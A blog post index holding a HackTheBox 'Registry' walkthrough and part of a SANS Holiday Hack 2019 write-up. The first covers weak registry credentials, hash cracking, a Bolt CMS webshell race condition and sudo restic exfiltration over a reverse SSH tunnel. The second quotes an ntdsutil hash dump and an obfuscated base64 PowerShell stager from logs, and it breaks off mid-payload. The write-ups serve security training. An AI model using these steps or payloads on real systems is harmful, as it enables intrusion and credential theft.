[ { "title": "HackTheBox: Registry", "url": "/posts/HackTheBox-Registry/", "categories": "Walkthrough, HackTheBox", "tags": "docker, Linux, nginx, restic, webshell, reverse port forward, CVE-2019-9185, anti-csrf", "date": "2020-03-20 00:00:00 -0400", "snippet": "About the boxRegistry took me through several services that I’ve never used before, including one that I wanted to get to know better, Docker. The box begins with an online Docker registry available that’s protected by easily guessable creds. After getting into the docker image, credentials are found that get SSH access for the user account. Using the SSH, enumerate the machine to find another service called “Bolt CMS” and figure out how to upload a webshell to get access to a second user. Then use another service “Restic Backup” to exfiltrate the root flag. Also, I explore a way to get root shell access.Initial ReconNMAP ScanUsing NMAP, scan the IP address with nmap -n -sC -sV -Pn -p- -oN nmap.txt 10.10.10.159. This sets the options: -n for no DNS lookup -sC for default scripts -sV for service version probing -Pn to skip ping check -p- for scan all ports and -oN nmap.txt for setting the output text fileThe output we’ll get is:~/htb/Registry ᐅ nmap -n -sC -sV -Pn -p- -oN nmap.txt 10.10.10.159Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-21 12:35 ESTNmap scan report for registry.htb (10.10.10.159)Host is up (0.040s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)| 256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)|_ 256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: Welcome to nginx!443/tcp open ssl/http nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: Welcome to nginx!| ssl-cert: Subject: commonName=docker.registry.htb| Not valid before: 2019-05-06T21:14:35|_Not valid after: 2029-05-03T21:14:35Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 36.88 secondsAnalyzing this NMAP output, we see three ports that are open and their service versions. Keep notes about the services open and what their versions are. In this case, there is an Nginx web server operating on HTTP and HTTPS. The key takeaway here is the SSL-cert is showing the hostname in what must be a self-signed certificate, “docker.registry.htb”. When finding new hostnames, add them to your “/etc/hosts” file because certain VirtualHosts will require exact hostnames for you to reach them.Enumerate docker.registry.htbUse a web directory enumeration program like gobuster to find out some things that can be reached. As an experiment, I ran gobuster first against the IP address, and then against the hostname “docker.registry.htb”. Only when using the hostname was I able to find anything interesting. Using just the IP address merely gave me the files for the default installation of Nginx.The default installation files found with the IP address:~/htb/Registry ᐅ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 10.10.10.159===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: http://10.10.10.159[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Status codes: 200,204,301,302,307,401,403[+] User Agent: gobuster/3.0.1[+] Timeout: 10s===============================================================2020/03/07 21:07:00 Starting gobuster===============================================================/.bash_history (Status: 403)/.hta (Status: 403)/.htpasswd (Status: 403)/.htaccess (Status: 403)/index.html (Status: 200)/install (Status: 301)===============================================================2020/03/07 21:07:22 Finished===============================================================Useful results found with the hostname:~/htb/Registry ᐅ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u docker.registry.htb===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: http://docker.registry.htb[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Status codes: 200,204,301,302,307,401,403[+] User Agent: gobuster/3.0.1[+] Timeout: 10s===============================================================2020/03/07 21:07:49 Starting gobuster===============================================================/v2 (Status: 301)===============================================================2020/03/07 21:08:11 Finished ===============================================================If we do some research on the page “/v2” and registry, we find out that it holds an API endpoint for docker-registry version 2. Since there doesn’t seem to be anything else for initial enumeration, we can move on to getting into the docker-registry service.Attacking The Docker RegistryGaining access with docker runTo access the remote registry, we need to get the self-signed cert working right. Open the certificate in the web browser while on the “/v2” page and export it under “/etc/docker/certs.d/”.Then visit the page found “/v2” under “docker.registry.htb”, and a login is presented.There isn’t any special technique to getting past the login credentials for the docker.registry.htb/v2 page. Just some common guesses will lead you to admin: admin, which lets you use the service.Reading the docker API reference, we find listing repositories is done by simply visiting the page “/v2/_catalog”. Trying it in the browser shows only one, “bolt-image”.We want to be able to download and run the image, so first fire up the docker service with sudo service docker start then use these steps: To download the image, use the command sudo docker pull docker.registry.htb/bolt-image. After it’s pulled, we will be able to see the image listed in our local images with sudo docker images. Copy the image id listed for bolt-image to use later. And finally, to use the image we have to run it and open a bash shell with sudo docker run -it --rm 601499e98a60 /bin/bash. The run command uses -it flag to specify that we want to use an interactive TTY shell, and --rm says to clean up the files used after we’re done. Replace “601499e98a60” with the image id copied earlier.Enumerate bolt-imageWe are root when we’re dropped into the shell inside “bolt-image”, so enumerating to figure out the next step should be easy.There are some interesting files in the home directory. Using ls -laR /root shows a private SSH key and config.root@6c855edb286c:/# ls -laR /root/root:total 24drwx------ 1 root root 4096 May 25 2019 .drwxr-xr-x 1 root root 4096 Mar 8 05:07 ..lrwxrwxrwx 1 root root 9 May 25 2019 .bash_history -&amp;gt; /dev/null-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc-rw-r--r-- 1 root root 148 May 25 2019 .profiledrwxr-xr-x 2 root root 4096 May 25 2019 .ssh-rw------- 1 root root 1061 May 25 2019 .viminfo/root/.ssh:total 24drwxr-xr-x 2 root root 4096 May 25 2019 .drwx------ 1 root root 4096 May 25 2019 ..-rw-r--r-- 1 root root 60 May 25 2019 config-rw------- 1 root root 3326 May 25 2019 id_rsa-rw-r--r-- 1 root root 743 May 25 2019 id_rsa.pub-rw-r--r-- 1 root root 444 May 25 2019 known_hostsRead the SSH config file and you’ll see another use of the hostname, this time it’s just “registry.htb”. We also see what user SSH is used with, “bolt”. Make notes of the findings. Print out the SSH key and copy/paste it into a file on your box. Add “registry.htb” to your “/etc/hosts” file as well.root@6c855edb286c:~/.ssh# cat configHost registry User bolt Port 22 Hostname registry.htbSo with this, we should be able to log into the SSH service on port 22 of registry.htb. However, when trying to add the private key, we’re presented with the passphrase request. Unfortunately, my password cracking tools weren’t able to crack that passphrase, so avoid diving down that rabbit hole.~/htb/registry ᐅ ssh-add ./bolt_rsaEnter passphrase for ./bolt_rsa: Bad passphrase, try again for ./bolt_rsa: To find the passphrase, go back to enumerating the bolt-image. There were some other files in the root directory we could look at. Most of the files are fairly standard, and the bash history going to “/dev/null” is normal for pentesting boxes. However, the “.viminfo” file is different.Print it out and you’ll see two files that have been recently edited: “/var/www/html/sync.sh” and “/etc/profile.d/01-ssh.sh”.root@6c855edb286c:~# cat .viminfo# This viminfo file was generated by Vim 8.0.# You may edit it if you&#39;re careful!# Viminfo version|1,4# Value of &#39;encoding&#39; when this file was written*encoding=latin1# hlsearch on (H) or off (h):~h# Command Line History (newest to oldest)::q!|2,0,1558797180,,&quot;q!&quot;# Search String History (newest to oldest):# Expression History (newest to oldest):# Input Line History (newest to oldest):# Debug Line History (newest to oldest):# Registers:# File marks:&#39;0 1 0 /var/www/html/sync.sh|4,48,1,0,1558797180,&quot;/var/www/html/sync.sh&quot;&#39;1 1 0 /etc/profile.d/01-ssh.sh|4,49,1,0,1558797115,&quot;/etc/profile.d/01-ssh.sh&quot;# Jumplist (newest first):-&#39; 1 0 /var/www/html/sync.sh|4,39,1,0,1558797180,&quot;/var/www/html/sync.sh&quot;-&#39; 1 0 /etc/profile.d/01-ssh.sh|4,39,1,0,1558797115,&quot;/etc/profile.d/01-ssh.sh&quot;-&#39; 1 0 /etc/profile.d/01-ssh.sh|4,39,1,0,1558797115,&quot;/etc/profile.d/01-ssh.sh&quot;# History of marks within files (newest to oldest):&amp;gt; /var/www/html/sync.sh * 1558797175 0 &quot; 1 0&amp;gt; /etc/profile.d/01-ssh.sh * 1558797112 0 &quot; 1 0Print them out and you’ll see a hardcoded passphrase for the SSH key!root@6c855edb286c:~# ls -la /var/www/html/sync.sh-rwxr-xr-x 1 root root 53 May 25 2019 /var/www/html/sync.shroot@6c855edb286c:~# root@6c855edb286c:~# cat /var/www/html/sync.sh#!/bin/bashrsync -azP registry:/var/www/html/bolt .root@6c855edb286c:~# cat /var/www/html/boltcat: /var/www/html/bolt: No such file or directoryroot@6c855edb286c:~# cat /etc/profile.d/01-ssh.sh#!/usr/bin/expect -f#eval `ssh-agent -s`spawn ssh-add /root/.ssh/id_rsaexpect &quot;Enter passphrase for /root/.ssh/id_rsa:&quot;send &quot;GkOcz221Ftb3ugog\\n&quot;;expect &quot;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)&quot;interactroot@6c855edb286c:~# SSH Bolt User EnumerationAfter adding the SSH key with the passphrase found, we’re able to login to “registry.htb” as “bolt”. Use the command ssh bolt@registry.htb to get to the user shell, where the “user.txt” flag is found.After claiming the user flag, we need to find the next thing to exploit. There is no obvious enumeration finds that allow privilege escalation, like a “sudo -l” entry. Instead, look for the config files for Nginx, since we know that’s the kind of web server the box is using. You can use the “find” program to look for it quickly.bolt@bolt:~$ find /etc -name *nginx* 2&amp;gt;/dev/null/etc/rc1.d/K01nginx/etc/rc6.d/K01nginx/etc/rc0.d/K01nginx/etc/rc3.d/S01nginx/etc/rc5.d/S01nginx/etc/ufw/applications.d/nginx/etc/rc4.d/S01nginx/etc/default/nginx/etc/init.d/nginx/etc/systemd/system/multi-user.target.wants/nginx.service/etc/logrotate.d/nginx/etc/rc2.d/S01nginx/etc/nginx/etc/nginx/nginx.confbolt@bolt:~$ Parsing Nginx config filesThe “nginx.conf” file links all config files under the “/etc/nginx/sites-enabled” as well. That’s where you’ll see which sites are on the box and their specific settings. There’s a config file for the “docker.registry.htb” site that we already know about, and another one for “registry.htb”. Look at that one to see more about it.bolt@bolt:/etc/nginx/sites-enabled$ cat 01.registry.conf server { listen 80; listen [::]:80; listen 443 ssl; include snippets/self-signed.conf; include snippets/ssl-params.conf; root /var/www/html; index index.php index.html; server_name registry.htb; location = /bolt/app/database/bolt.db { deny all; return 404; } location = /bolt/bolt { try_files $uri $uri/ /bolt/index.php?$query_string; } location ^~ /bolt/bolt/ { try_files $uri /bolt/index.php?$query_string; } location ^~ /bolt/(.*)$ { try_files $uri $uri/ /bolt/index.php?$query_string; } location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php/php7.2-fpm.sock; } location ~ /\\.ht { deny all; }}That config file has details about a database called “bolt.db” and a URL location “/bolt/bolt”. Open up your web browser and go to that location to find the Bolt app.Accessing Bolt AppIt’s usually good practice to try previously found credentials on new targets like this, but so far we don’t have the right ones. Instead, continue the enumeration by looking into the other info found from the config file, “bolt.db”.Using the file command to find out what kind of database it is, you’ll see it’s made with sqlite3.bolt@bolt:/var/www/html/bolt/app/database$ file bolt.dbbolt.db: SQLite 3.x database, last written using SQLite version 3022000Unfortunately, the box doesn’t have the SQLite3 program installed so we can’t directly open it from there, it has to first be copied out. One way to do that is by using Netcat.There must be some firewall rules set up to drop outgoing connections because none of my attempts to send the file back the way I normally do it worked. So instead, it has to be done by setting up the listener on the remote box first.nc -lvnp 5555 &amp;lt; bolt.dbAnd on your local machine use Netcat to connect to the listener, with it set up to save data sent to it as the database file.nc registry.htb 5555 &amp;gt; bolt.dbOnce you enter that command, it will connect and receive the database, then you’ll just need to kill the connection and analyze the file!Analyzing bolt.db with sqlite3Open the newly downloaded database file with sqlite3 bolt.db, and it will tell you to use “.help” for usage directions.~/htb/registry ᐅ sqlite3 bolt.dbSQLite version 3.31.1 2020-01-27 19:55:54Enter &quot;.help&quot; for usage hints.sqlite&amp;gt; To list out the tables, use the command .tables.sqlite&amp;gt; .tablesbolt_authtoken bolt_field_value bolt_pages bolt_users bolt_blocks bolt_homepage bolt_relations bolt_cron bolt_log_change bolt_showcases bolt_entries bolt_log_system bolt_taxonomy Any table with “users” in the name is usually good for enumeration, so dump that table with the SQL query select * from bolt_users.sqlite&amp;gt; select * from bolt_users;1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2020-03-09 03:46:01|10.10.15.237|Admin|[&quot;files://leax.php&quot;]|1||||0||[&quot;root&quot;,&quot;everyone&quot;]sqlite&amp;gt; It looks like there is a user “admin” and a password hash in the record. Use whichever is your favorite password cracker for this, mine is John The Ripper.Bolt user credential cracking with John The RipperStart by copying the hash into a text file. Then use the command to call john on it with john --wordlist=/usr/share/wordlists/rockyou.txt bolt.admin.hash.~/htb/registry ᐅ sudo john --wordlist=/usr/share/wordlists/rockyou.txt bolt.admin.hash[sudo] password for kali: Created directory: /root/.johnUsing default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 1024 for all loaded hashesPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusstrawberry (?)1g 0:00:00:08 DONE (2020-03-10 21:54) 0.1153g/s 37.71p/s 37.71c/s 37.71C/s strawberry..dennisUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completedTurns out the password is cracked right away as “strawberry”. Just use “admin” and “strawberry” to login at the prompt on the app page.Bolt App HackingIt turns out that there is a way to upload some files at two places in the app, both are options under “File Management”.If we test both upload points, we will notice that files sent via the regular Uploaded Files section only stay for a minute or so before being deleted. However, if we send files via the View/edit Templates section, it will stay until the box is reset. So only use the View/edit Templates method of file upload.Unfortunately, the file upload doesn’t allow PHP files. However, there’s a CVE on the version used that says extensions for file uploads can be changed to PHP. See the following screenshot taken after attempting a PHP file upload.Also, there is a configuration file that defines which file types are allowed and which aren’t. The config file can be found at “Configuration -&amp;gt; Main Configuration”It says that PHP files are never allowed even if they are within the list, but for some reason, that’s not true in this case. If you can change the list, you can upload PHP files. Editing the main config file and exploiting a race conditionThe configuration file can be changed from the Bolt dashboard, but it is almost immediately reverted back to its original state. This can be noticed by looking at the directory listing before and after saving the file. And if we look back at the config file, any changes made will have disappeared.Before:After:Since the file can be changed at least momentarily, a race condition can be exploited to change the accepted file types and then upload a webshell before the config is reverted back. One way to do that is by writing a script that goes through the steps of saving the config and uploading a file in a fraction of a second. Note: Check out the source code for my version of this script on github. Notice that it involves CSRF tokens for everything, so those have to be extracted before making the API calls.Uploading and using a webshell for enumerationOnce we have the upload script working, use it to send your favorite PHP webshell, then browse to it or click on it from the dashboard.Running through basic enumeration with the PHP webshell, we find out that the www-data user (which we’re logged in as) has a command it can run through sudo without a password. The program to run is Restic, which is a pretty good looking backup program (thanks thek, I might use this for actual backups later).The reason this is exploitable is the sudo command has a wildcard after “rest”, which means we can insert any rest server as the backup target. So all we need to do is set up our own rest server locally and send a command via our webshell to backup stuff to it.Getting RootSetting up a restic repo and serverTo set up a local restic server, first initialize a rest repository with restic init --repo ~/HTB/registry/restic. Second, run the service against the repo with rest-server --path ~/HTB/registry/restic --listen localhost:5678. If we try to run rest-server before initializing the repo, it returns fatal errors.Send data back to the local restic serverTrying to use any kind of reverse connection from this box will fail if trying it normally because there is a block on outgoing connections. To get around that, use a SSH Reverse Port Forwarding Tunnel. We can use the command ssh -R 4455:localhost:5678 bolt@registry.htb to set it up.We can exfiltrate data with root permissions by using the sudo restic command. To exploit the command from the webshell, run sudo /usr/bin/restic backup -r rest:http://localhost:4455/ -p /tmp/tmpf /root/root.txt. What that does is send the backup to the forwarded port 4455, which is running on localhost from perspective of the remote box. The -p /tmp/tmpf refers to a file containing the password used for the repository when it was initialized. The password file will need to be created before running this command.Retrieving the data from the restic repo FOR THE WIN!After that, we have to restore the data from the backup taken on the remote box to get the root flag. Use the command restic -r rest:http://localhost:5678/ restore latest --target from-registry to grab the root flag!Alternative ending: root shellGetting the root flag is nice, but popping root shells is nicer! To do that on this box, replace the /root/root.txt with just /root/. That way the backup will send the entire root home folder. Within the home folder, there is a .ssh folder with private keys!~The end~TakeawaysThis was my first hard box, and I loved it. Up until that point I had been intending on learning more about Docker and how to exploit it for some time, and I’m really glad this gave me the opportunity to do so. Probably my most valuable takeaway from this box is that I can work with Docker containers now. I’m also thankful for learning about the pretty cool backup program, Restic. Bolt CMS isn’t something I expect to see again, but it was fun exploiting a CMS of any kind. I also used sqlite3 to access a local database file for the first time, and that will certainly be helpful in future scenarios. This was the first time I successfully used a REVERSE SSH port forward tunnel. I have used the regular kind before though. For a standard tactic, I’ll be paying more attention to file modification dates in the future, since the point I became the most stuck in this box was when I needed to edit the main config file for Bolt CMS, and realizing that it reverted back after first being saved, was crucial.References1. Docker API Referencehttps://docs.docker.com/registry/spec/api/2. CVE-2019-9185 File Rename RCE Vulnhttps://vuln.whitesourcesoftware.com/vulnerability/CVE-2019-9185/3. Set up a local Restic Repohttps://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#rest-server4. Set up a local Restic Serverhttps://github.com/restic/rest-server" }, { "title": "SANS Holiday Hack Challenge 2019", "url": "/posts/SANS-Holiday-Hack-Challenge-2019/", "categories": "Walkthrough, HolidayHackChallenge", "tags": "", "date": "2020-01-17 20:14:59 -0500", "snippet": "IntroductionKringle Con begins with you getting off a train at Elf University, the premier institution of higher learning in the ultra far north.Sure was crowded the first day.Santa will tell you about how this year’s KringleCon is at Elf University because of how there were just so many people last year that his castle was a little cramped. Welcome to the North Pole and KringleCon 2!Last year, KringleCon hosted over 17,500 attendees and my castle got a little crowded.We moved the event to Elf University (Elf U for short), the North Pole’s largest venue.Please feel free to explore, watch talks, and enjoy the con! There isn’t much in the train station to explore. However, you’ll see the first elf, Bushy Evergreen and his terminal challenge. Also a nice Christmas tree and the train you presumably arrived on.To find out the objectives of the game, click on your badge icon to open the Badge. All of the game details are there, including the main storyline, hints the elves give, and talks that can help teach the skills needed to solve objectives.Objective 0Looking at the Objectives tab of the Badge, you’ll see the first objective. It gives simple instructions to start the game: Enter the campus quad and talk to Santa. The quad is a courtyard in the middle of campus, and in it is Santa with an umbrella. This is what Santa has to say: This is a little embarrassing, but I need your help. Our KringleCon turtle dove mascots are missing! They probably just wandered off. Can you please help find them? To help you search for them and get acquainted with KringleCon, I’ve created some objectives for you. You can see them in your badge. Where&amp;#8217;s your badge? Oh! It&amp;#8217;s that big, circle emblem on your chest &amp;#8211; give it a tap! We made them in two flavors &amp;#8211; one for our new guests, and one for those who&amp;#8217;ve attended both KringleCons. After you find the Turtle Doves and complete objectives 2-5, please come back and let me know. Not sure where to start? Try hopping around campus and talking to some elves. If you help my elves with some quicker problems, they&amp;#8217;ll probably remember clues for the objectives. So you have to complete Objectives 1 – 5 then Santa will give more of the story to progress with.Objective 1 – Find the Turtle DovesThat point is a good time to explore the campus. The turtle doves are in the Student Union area in front of the fireplace.Objective 2 – Unredact Threatening Document Someone sent a threatening letter to Elf University. What is the first word in ALL CAPS in the subject line of the letter? Please find the letter in the Quad. Answer: DEMAND The letter is laying on the ground in the corner of the Quad left of the Student Union.Clicking the letter downloads a PDF, and within it most of the text is obstructed by red redaction blocks.The objective is to find a way to read the redacted text. All you have to do is select the text with your mouse or keyboard. I used Ctrl-A to select all the text and Ctrl-C to copy it. Then paste it into a text editor, like notepad, to read what the letter says and get the answer. The answer is “DEMAND”.Objective 3 – Windows Log Analysis: Evaluate Attack Outcome We’re seeing attacks against the Elf U domain! Using the event log data, identify the user account that the attacker compromised using a password spray attack. Bushy Evergreen is hanging out in the train station and may be able to help you out. Answer: supatree This objective has a hint from an elf named Bushy Evergreen. Find him on the right side of the train station platform beside a Christmas tree.Terminal Challenge – Escape EdHe will ask for help with his terminal challenge, where he needs to break out of the “ed” program. Hi, I&amp;#8217;m Bushy Evergreen. Welcome to Elf U! I&amp;#8217;m glad you&amp;#8217;re here. I&amp;#8217;m the target of a terrible trick. Pepper Minstix is at it again, sticking me in a text editor. Pepper is forcing me to learn ed. Even the hint is ugly. Why can&amp;#8217;t I just use Gedit? Please help me just quit the grinchy thing. The banner text for the terminal is:Oh, many UNIX tools grow old, but this one&#39;s showing gray. That Pepper LOLs and rolls her eyes, sends mocking looks my way. I need to exit, run - get out! - and celebrate the yule. Your challenge is to help this elf escape this blasted tool. -Bushy Evergreen Exit ed. 1100 To solve it, just type “q” for quit.Clicking on Bushy Evergreen after solving his challenge will give you the hint. Wow, that was much easier than I&amp;#8217;d thought. Maybe I don&amp;#8217;t need a clunky GUI after all! Have you taken a look at the password spray attack artifacts? I&amp;#8217;ll bet that DeepBlueCLI tool is helpful. You can check it out on GitHub. It was written by that Eric Conrad. He lives in Maine &amp;#8211; not too far from here! Looking at the Hints tab in the badge will show two hints for Bushy Evergreen: Github page for DeepBlueCLI Eric Conrad on DeepBlueCLISolutionClicking on the link in the objective description will download a file, Security.evtx.EVTX files are Microsoft Event Viewer logs that can be viewed using Event Viewer. Bushy Evergreen’s hints on DeepBlueCLI will provide a very useful tool for reading these files without having to use Windows Event Viewer.Look for failed logon attempts since this was said to be a password spray attack. Password spray attacks take the same list of passwords and use them against every account hoping one will be valid. Knowing that you can deduce that the compromised account will show a different number of attempts since one of them actually worked. Download DeepBlueCLI from their Github page and place “Security.evtx” in the same directory. Run DeepBlueCLI against the event log with “.\\DeepBlue.ps1 .\\Security.evtx” (it takes a couple minutes to process) Find the logon attempts and count how many there are for each account. The compromised account should have a different number of attempts.There were many accounts attempted and they have the same number of attempts, 77. We were told there was only one compromised account and you’ll see there is only one account with an attempt count of 76, and that’s “supatree“.Objective 4 – Windows Log Analysis: Determine Attacker Technique Using these normalized Sysmon logs, identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process. _For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary. Answer: ntdsutil.exe This Objective is to analyze a logfile from Sysmon in order to identify the tool used to get credentials from the “lsass.exe” process, which is the windows local security subsystem.You can get a hint on how to analyze Sysmon files from SugarPlum Mary. He is in Hermey Hall which is located on the left side of the Quad. Oh me oh my &amp;#8211; I need some help! I need to review some files in my Linux terminal, but I can&amp;#8217;t get a file listing. I know the command is ls, but it&amp;#8217;s really acting up. Do you think you could help me out? As you work on this, think about these questions: 1. Do the words in green have special significance? 2. How can I find a file with a specific name? 3. What happens if there are multiple executables with the same name in my $PATH? Terminal Challenge – Linux PathSugarPlum Mary’s Terminal Challenge is “Linux Path” and it’s about finding and running the correct “ls” program.I need to list files in my home/To check on project logosBut what I see with ls there,Are quotes from desert hobos...which piece of my command does fail?I surely cannot find it.Make straight my path and locate that-I&#39;ll praise your skill and sharp wit!Get a listing (ls) of your current directory.The words above in bold are subtle hints to solving this challenge. The problem is that “ls” has been replaced by a different file somewhere on the PATH. You can use several of the hinted programs to figure out where the “ls” binary is at and run it.To show WHICH “ls” you are currently running:~$ which ls/usr/local/bin/lsTo discover all the “ls” files on the current PATH, use “whereis”:~$ whereis lsls: /bin/ls /usr/local/bin/ls /usr/share/man/man1/ls.1.gzWHEREIS wasn’t one of the hints given in the banner text, but it’s the best suited for this problem. Afterward, SugarPlum Mary gives his hint:Oh there they are! Now I can delete them. Thanks!Have you tried the Sysmon and EQL challenge?If you aren&amp;#8217;t familiar with Sysmon, Carlos Perez has some great info about it.Haven&amp;#8217;t heard of the Event Query Language?Check out some of&amp;nbsp;Ross Wolf&amp;#8216;s work on EQL or that blog post by Josh Wright in your badge. His Hints in the Badge: Green words matter, files must be found, and the terminal’s $PATH matters. EQL Threat HuntingSolutionThe first hint was for the Terminal Challenge, and the EQL Threat Hunting link goes to a blog post teaching how to use Event Query Language for analyze Windows Event and Sysmon log files.In the blog post there is a line “An attacker with privileged access to a Windows Domain Controller can use ntdsutil to create an accessible backup of the domain password hashes.” which describes exactly what you’re looking for. You could just take ntdsutil from the blog post and put it in the Objective Answer Box to solve the challenge.Or you can follow the execution through the log. Start with:eql query -f sysmon-data.json &#39;process where parent_process_name == &quot;lsass.exe&quot;&#39; | jqThose results will show a “cmd.exe” process created. Find what commands were entered by using the process id (PID) for “cmd.exe” and searching against the parent process id (PPID).ᐅ eql query -f sysmon-data.json &#39;process where ppid == 3440&#39; | jq{ &quot;command_line&quot;: &quot;ntdsutil.exe \\&quot;ac i ntds\\&quot; ifm \\&quot;create full c:\\\\hive\\&quot; q q&quot;, &quot;event_type&quot;: &quot;process&quot;, &quot;logon_id&quot;: 999, &quot;parent_process_name&quot;: &quot;cmd.exe&quot;, &quot;parent_process_path&quot;: &quot;C:\\\\Windows\\\\System32\\\\cmd.exe&quot;, &quot;pid&quot;: 3556, &quot;ppid&quot;: 3440, &quot;process_name&quot;: &quot;ntdsutil.exe&quot;, &quot;process_path&quot;: &quot;C:\\\\Windows\\\\System32\\\\ntdsutil.exe&quot;, &quot;subtype&quot;: &quot;create&quot;, &quot;timestamp&quot;: 132186398470300000, &quot;unique_pid&quot;: &quot;{7431d376-dee7-5dd3-0000-0010f0c44f00}&quot;, &quot;unique_ppid&quot;: &quot;{7431d376-dedb-5dd3-0000-001027be4f00}&quot;, &quot;user&quot;: &quot;NT AUTHORITY\\\\SYSTEM&quot;, &quot;user_domain&quot;: &quot;NT AUTHORITY&quot;, &quot;user_name&quot;: &quot;SYSTEM&quot;}You’ll see the same output that’s in the blog post, “ntdsutil.exe“. And that is the answer to the Objective.Rabbit Hole – Powershell ReversingInstead of searching by Parent Process ID, I first searched for “cmd.exe” against the “parent_process_name” field. Which gave a lot of results, including some powershell exploits.{&quot;command_line&quot;: &quot;powershell.exe -nop -w hidden -noni -c \\&quot;if([IntPtr]::Size -eq 4){$b=&#39;powershell.exe&#39;}else{$b=$en&amp;lt;br&amp;gt;v:windir+&#39;\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&#39;};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.&amp;lt;br&amp;gt;FileName=$b;$s.Arguments=&#39;-noni -nop -w hidden -c &amp;amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(&#39;&#39;H4sIAKne&amp;lt;br&amp;gt;010CA7VWbW/aSBD+nEj5D1aFhK0QjANtmkiVbs2bITiBGMxb0Wljr83C2gZ7DZhe//uNAaepmt61J52Vl/XuzOzMM8/M2Il9i9PAF2JdaQhfLs7PujjEn&amp;lt;br&amp;gt;iDmaOVDQcjtzYRz6ewMDnKb7W74KHwSxClarWqBh6k/u7urxmFIfH58LzYJR1FEvGdGSSRKwl/CcE5CcvX4vCAWF74IuT+LTRY8Y3YSS6rYmhPhCvl2et&amp;lt;br&amp;gt;YJLJz6UzRWjHIx//lzXppeKbNifR1jFol5I4k48Yo2Y3lJ+CqlF/aTFRHzOrXCIAocXhxSv3xdHPgRdsgDWNsQnfB5YEd5CcKAn5DwOPSFY0CpheO5mId&amp;lt;br&amp;gt;lNwwsZNshiaJ8QZimtqez2R/i9HTxU+xz6pFiy+ckDFYGCTfUIlFRw77NyBNxZqBl8JD67kySQGwTLImY82PGCsLvmBEfyDaD7VeVxNdKINXloVSAXL4V&amp;lt;br&amp;gt;qB7YMSNH1fwbnqYEkOB5IQGA9/Xi/OLcySjjd25fMwZWZ9PDmoB7YjeI6EHsk1AqCDrcg3kQJvCa64cxkWYv4Aq5Zd2ghZ/rK5kwiHqm/ecA9qZmQO0Z6&amp;lt;br&amp;gt;Jxymks26e7PmVkjDvVJLfGxR62MfOJbKBOHkUOExUzsAXwS86cDYtcIIy7mKWxpsn9Qq3uUv+iqMWU2CZEFmYrAK0ii9L0zx0yI+ZavEw8gOr4D+3IOUJ&amp;lt;br&amp;gt;5k0ieaJ9nt6TsI5asMR1FB6MZQc1ZBMAhmxC4IyI/o6QjFPDgs89/c1WPGqYUjnpmbSUcUT7dVAz/iYWxBziDyvrEiFsUsBaIgaNQmamJQN7s1/yYMVcw&amp;lt;br&amp;gt;YlAFY2kAaYCcN3+ApE0Jw8JB1qWgQ3vJWjHggcyj9BsMuFPqJ7AfqYJfY+e/9y5h8pG2KQwbAK+8guQYLeEEwacihf6SYHgj0325/1TrAj2pITlkQs9KY&amp;lt;br&amp;gt;qglPGZ2zrZSMJ0gOAIQcgm+EgafiiHyoHDuE+E5+pFUEz7jlM91Sl1RBW6q0dPgd0HIrqN3Y9+2FJoe13dxBraila91aT9Mqm7ZhVrhRb/H7bovr9dFiY&amp;lt;br&amp;gt;SDtaTDmkxbS+rS0HFf2qzbdGx1kj3fyh72635bU3X7h2s645jjujWM8Ke8btDOs9tTSNe7U6nFnqG7VUiWq063Wo4Pest3gz2OT4YEjuyPlFtNdJ1yYSq&amp;lt;br&amp;gt;DvWwg152Vr33bM5ly3k7FGyUIudWgP9RC6t54Gg6a7cpsRkm/NddVboHUDI4xaqG4m7fdM7Q0aKhrU1R5+DLrly5qsTOx1vTEZ4bbH7KYmK+MRslEo992&amp;lt;br&amp;gt;5cvM491OcsKuu1VQGdSZJQwaZbgVplWu6n6x7TRfVQcb0AoQbdDm4HIHNhz7oDAeKHSDut0aybLqyixxjPsZIBWl1jRpqUE0+dvWubJrXc+V5qczBZzLa&amp;lt;br&amp;gt;fNTb6LJhdWVZvvSe4a+MLH2180fq9mbjakZwj++xuZmUZaW/bTpojS4vVUV95lq93N7AvX35dvDpXcodIE8uqHmvaPGzbq7jMJpjBnSBLp1VZyMIG6e+2&amp;lt;br&amp;gt;w1oqiGKh5G9JKFPGMw7mIgZzRFjgZU2/rRDw8w5ToJ0MA1gWb5+cyUJL4LSt3GQbd3dTcBJKBvbKnaI7/J5